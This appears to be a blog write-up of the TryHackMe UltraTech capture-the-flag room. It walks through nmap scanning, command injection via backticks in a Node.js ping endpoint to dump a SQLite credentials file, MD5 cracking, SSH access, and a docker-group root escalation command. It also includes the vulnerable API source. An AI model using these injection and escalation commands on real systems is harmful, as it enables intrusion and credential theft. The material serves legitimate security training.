---
layout: default
---

# TryHackMe - UltraTech writeup 

![UltraTech header](/assets/images/thm_ultratech/ultratech_header.png)

[TryHackMe UltraTech room link](https://tryhackme.com/room/ultratech1)

:hole: :computer:

> "This room is inspired from real-life vulnerabilities and misconfigurations I encountered during security assessments."

> "You have been contracted by UltraTech to pentest their infrastructure.
> It is a grey-box kind of assessment, the only information you have
> is the company's name and their server's IP address."

This system is quite interesting as it represents a mock web development company and some systems that they might make use of. It starts off with a Apache web server located on an odd port 31331 and a Node.js API instance located on port 8081. Enumerating the web application manually we find that the website makes two different endpoint calls to the node.js API. One for the login/authorization logic and another one to check the ping of the server. We find a command injection vulnerability through one of these API endpoints and then read a sensitive database file that grants us with a MD5 password hash that we then decrypt and login via SSH. Privilege Escalation on this machine involves identifying that the user is part of the _docker_ group and thus we find a GTFObins command to gain a root shell. 

## Initial recon
### Nmap scan

Lets start with an TCP SYN (-sS) version (-sV) scan of all (-p) TCP ports amd lets try to identify the operating system also (-O) and run default scripts (-sC).
Very verbose (-vv) output to see the open ports live as the scan runs and also output to all formats (-oA).

```
sudo nmap 10.10.61.233 -sS -sV -sC -O -vv -p- -oA tcp_all_ver_def
```

Lets also do a quick scan of the top 1000 default UDP ports and include its service version (-sUV)
```
sudo nmap 10.10.61.233 -sUV -vv -oA udp_ver_top_1000
```

#### TCP Results

```
# Nmap 7.80 scan initiated Wed Jul 22 13:21:15 2020 as: nmap -sS -sV -sC -O -vv -p- -oA tcp_all_ver_def 10.10.61.233
Nmap scan report for 10.10.61.233
Host is up, received echo-reply ttl 63 (0.17s latency).
Scanned at 2020-07-22 13:21:16 EDT for 378s
Not shown: 65531 closed ports
Reason: 65531 resets
PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDiFl7iswZsMnnI2RuX0ezMMVjUXFY1lJmZr3+H701ZA6nJUb2ymZyXusE/wuqL4BZ+x5gF2DLLRH7fdJkdebuuaMpQtQfEdsOMT+JakQgCDls38FH1jcrpGI3MY55eHcSilT/EsErmuvYv1s3Yvqds6xoxyvGgdptdqiaj4KFBNSDVneCSF/K7IQdbavM3Q7SgKchHJUHt6XO3gICmZmq8tSAdd2b2Ik/rYzpIiyMtfP3iWsyVgjR/q8oR08C2lFpPN8uSyIHkeH1py0aGl+V1E7j2yvVMIb4m3jGtLWH89iePTXmfLkin2feT6qAm7acdktZRJTjaJ8lEMFTHEijJ
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLy2NkFfAZMY462Bf2wSIGzla3CDXwLNlGEpaCs1Uj55Psxk5Go/Y6Cw52NEljhi9fiXOOkIxpBEC8bOvEcNeNY=
|   256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEipoohPz5HURhNfvE+WYz4Hc26k5ObMPnAQNoUDsge3
8081/tcp  open  http    syn-ack ttl 63 Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 15C1B7515662078EF4B5C724E2927A96
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=7/22%OT=21%CT=1%CU=42689%PV=Y%DS=2%DC=I%G=Y%TM=5F18770
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=A)OPS
OS:(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST1
OS:1NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 46.188 days (since Sat Jun  6 08:56:26 2020)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 22 13:27:34 2020 -- 1 IP address (1 host up) scanned in 379.10 seconds
```

The only real ports of interest are 8081 and 31331. It also seems like the operating system is Ubuntu. 
```
8081/tcp  open  http    syn-ack ttl 63 Node.js Express framework
31331/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
```

#### UDP Results

```
# Nmap 7.80 scan initiated Wed Jul 22 13:38:43 2020 as: nmap -sUV -vv -oA udp_ver_top_1000 10.10.61.233
Increasing send delay for 10.10.61.233 from 400 to 800 due to 11 out of 12 dropped probes since last increase.
Nmap scan report for 10.10.61.233
Host is up, received echo-reply ttl 63 (0.17s latency).
Scanned at 2020-07-22 13:38:43 EDT for 1186s
Not shown: 999 closed ports
Reason: 999 port-unreaches
PORT   STATE         SERVICE REASON      VERSION
68/udp open|filtered dhcpc   no-response

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 22 13:58:29 2020 -- 1 IP address (1 host up) scanned in 1185.84 seconds
```

Nothing interesting picked up on the UDP scan.

## Enumeration

Lets check out the Apache web server and inspect the web application for any interesting information and functionality.

Viewing the websites landing page source code reveals nothing interesting besides the fact the website is made using HTML and JavaScript.

Checking out the **robots.txt** file reveals the **/utech_sitemap.txt** URL file path. We check this out and it shows us an interesting **/partners.html** page that contains a login form.

![UltraTech Website](/assets/images/thm_ultratech/thm_ultratech_webpage_1.jpg)

Start BurpSuite, put the proxy intercept on and set your web browser to proxy to BurpSuite.

Fill out the login form and intercept the request in BurpSuite for further enumeration.

![BurpSuite proxy](/assets/images/thm_ultratech/thm_ultratech_burpsuite_1.jpg)

As you can see the login form makes a GET request to the following URL, note the host and port.
> http://10.10.61.233:8081/auth?login=admin&password=testpass

The web application also periodically makes another GET request to a different API endpoint path.
> http://10.10.61.233:8081/ping?ip=10.10.61.233 

![BurpSuite ping request capture](/assets/images/thm_ultratech/thm_ultratech_burpsuite_2.jpg)

Inspecting the source code for the **partners.html** web page that contains the login form makes a reference to a Javascript api file.
```
<script src='js/api.js'></script>
```

The source code from the **api.js** file

```javascript
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
	return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
		if (req.readyState === 4) {
		    if (req.status === 200) {
			console.log('The api seems to be running')
		    } else {
			console.error(req.statusText);
		    }
		}
	    };
	    req.onerror = function (e) {
		console.error(xhr.statusText);
	    };
	    req.send(null);
	}
	catch (e) {
	    console.error(e)
	    console.log('API Error');
	}
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
    
})();
```

This explains the random ping GET requests and the form action path.

### Playing with the node.js API endpoint routes

We found the auth and ping routes by simply enumerating the web application with BurpSuite.
> http://10.10.61.233:8081/auth?login=admin&password=testpass
> http://10.10.61.233:8081/ping?ip=10.10.61.233 

You can run a directory scan using gobuster or dibuster and you should find the auth and ping routes easily also.

```
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Wed Jul 22 13:49:53 EDT 2020
--------------------------------

http://10.10.61.233:8081
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/
/auth/
/Auth/

Dirs found with a 500 response:

/ping/
/Ping/

--------------------------------
--------------------------------
```

I tried to do simple SQL injection into the auth endpoint login and password URL parameters to no avail.

The ping endpoint looks interesting and it takes and **ip** parameter. Lets see if we can get command injection using.

![Node.js API command injection](/assets/images/thm_ultratech/thm_ultratech_node_api_1.jpg)

As you can see we have command injection in the ip parameter for the ping API endpoint.
```
# List the contents of the current directory using ls, note we had to use the back ticks to make this work
http://10.10.61.233:8081/ping?ip=`ls`

# This shows us the tech.db.sqlite file, lets cat it to see its contents
http://10.10.61.233:8081/ping?ip=`cat%20utech.db.sqlite`
```

As you can see we get two usernames and what looks like their associated password hashes.

You can use **hash-identifier** on Kali Linux to identify what type of hash it is. It identifies them as MD5 hashes.

You can then use a cloud cracking website like [crackstation.net](https://crackstation.net/) to quickly crack MD5 hashes.

This will reveal both plaintext passwords.

## Privilege Escalation

The r00t users passwords works to allow us to SSH into the target system. Running a quick **id** command tells us that this user is part of the **docker** group which is interesting.

![Intial Shell](/assets/images/thm_ultratech/thm_ultratech_initial_shell.jpg)

Linpeas confirms our suspicions and states that the docker group seems to be a viable privilege escalation vector.

![Linpeas Results](/assets/images/thm_ultratech/thm_ultratech_linpeas.jpg)

Checking out [GTFOBins](https://gtfobins.github.io/gtfobins/docker/#shell) for docker reveals the following command that can be used to gain root provided we are part of the docker group which we are as the r00t user.

```
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

![GTFOBins Docker](/assets/images/thm_ultratech/thm_ultratech_gtfo.jpg)

Using the above command we are able to get root privileges and then read the last flag container in the root users .ssh folder.

## Summary

This system is meant to represent a entity that uses a HTML and Javascript web application that interfaces with a node.js backend API that is contained in a docker container. The API source code and functionality is prone to command injection as the GET parameters sent to it our not sanitized correctly. Also the docker container was not setup correctly which lead to the privilege escalation attack. Refer to the references for further explanation of the docker PE vector and how to secure it.

## Notes

index.js source code that was responsible for the command injection.

```javascript
const express = require('express')
const cors = require('cors')
const app = express()
const sqlite = require('sqlite3')
const shell = require('shelljs')
const md5 = require('md5')

//
const PORT = 8081
let db = null
let users = []
const loggedView = `<html>
<h1>Restricted area</h1>
<p>Hey r00t, can you please have a look at the server's configuration?<br/>
The intern did it and I don't really trust him.<br/>
Thanks!<br/><br/>
<i>lp1</i></p>
</html>`

function exec(cmd, res) {
    shell.exec(cmd, (code, stdout, stderr) => {
        if (stderr) {
            res.send(stderr)
        } else {
            res.send(stdout)
        }
    })
}

function initDB() {
    db = new sqlite.Database('utech.db.sqlite');
    db.each('select * from users', (err, row) => {
        users.push(row)
    })
}


app.use(cors())

app.get('/', (req, res) => {
    res.send('UltraTech API v0.1.3')
})

app.get('/ping', (req, res) => {
    const ip = req.query.ip.replace(/[\;|\$|&]/g, '').replace(/&/g, '')
    if (ip) {
        const cmd = `ping -c 1 ${ip}`
        console.log('cmd is', cmd)
//        const output = execSync(cmd, { encoding: 'utf-8' });
        exec(cmd, res);
    } else {
        res.send('Invalid ip parameter specified')
    }
})

app.get('/auth', (req, res) => {
    const login = req.query.login;
    const password = req.query.password;
    if (!login || !password) {
        res.send('You must specify a login and a password')
    } else {
        for (let user of users) {
            if (user.login === login && user.password === md5(password)) {
                res.send(loggedView)
                return
            } 
        }
        res.send('Invalid credentials')
    }
})

initDB()

app.listen(PORT, function () {
    console.log(`UltraTech listening on ${PORT}`)
})

```

## References
* https://blog.martiert.com/the-docker-group-and-privilege-escalation/
* https://www.hackingarticles.in/docker-privilege-escalation/
* https://root4loot.com/post/docker-privilege-escalation/